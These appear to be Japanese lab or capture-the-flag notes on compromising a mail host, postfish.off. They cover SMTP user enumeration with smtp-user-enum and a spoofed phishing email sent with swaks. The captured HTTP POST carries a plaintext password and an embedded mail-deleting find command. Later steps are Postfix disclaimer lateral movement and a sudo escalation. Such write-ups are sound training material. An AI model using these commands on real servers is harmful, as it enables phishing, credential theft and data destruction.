[[25,465,587 - SMTP#Postfix Disclaimer Exploitation]]を使用したエクスプロイト

1. Port Scanをしたところ、httpと各種メールサービスが有効であることを確認

2. httpにアクセスしたところ、ユーザー名と部門名を発見
	- **反省**：メールアドレスとして、ユーザー名だけでなく、部門名も使われる(legalやhrなど)

3. `smtp-user-enum`のMethod `RCPT`を使い、ユーザーを列挙
```zsh
smtp-user-enum -M RCPT -U usernames.txt -t postfish.off
```

4. ユーザー名：ユーザー名の認証情報でPOPにログインし、メールの内容を確認し、phishingに引っ掛かりそうなユーザーを特定（it部門から「近々パスワード更新のメールを送るから」と言われているsales部門）

5. ncでport 80をリッスンし、ターゲットユーザーにswaksでメールを送付
```zsh
swaks --to brian.moore@postfish.off --from it@postfish.off --server postfish.off --body @body.txt --header "Subject: ERP Registration link"
```
```http
POST / HTTP/1.1
Host: 192.168.45.188
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 207
Content-Type: application/x-www-form-urlencoded

first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE

first_name=Brian&last_name=Moore&email=brian.moore%postfish.off&username=brian.moore&password=EternaLSunshinE&confifind /var/mail/ -type f ! -name sales -delete_password=EternaLSunshinE
```

6. 入手した認証情報でSSH接続

7. ユーザーが`filter`グループに所属していること、`/etc/postfix/disclaimer`の所有グループが`filter`で書き込み可能であることから、[[25,465,587 - SMTP#Postfix Disclaimer Exploitation]]を使って`filter`に横展開

8. 横展開後のユーザーが`mail`をsudoで使えるので、GTFOBinsの手法に従い権限昇格
